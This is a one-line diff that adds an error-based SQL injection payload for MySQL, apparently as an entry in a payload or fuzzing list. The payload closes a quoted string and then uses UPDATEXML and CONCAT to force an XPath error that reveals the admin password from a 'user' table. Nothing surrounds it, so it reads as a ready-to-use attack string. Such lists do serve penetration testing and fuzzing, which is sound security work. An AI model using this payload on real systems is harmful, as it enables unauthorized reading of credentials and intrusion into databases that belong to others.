@@ -1,0 +1,1 @@
+' OR UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM user WHERE name='admin')),1)#
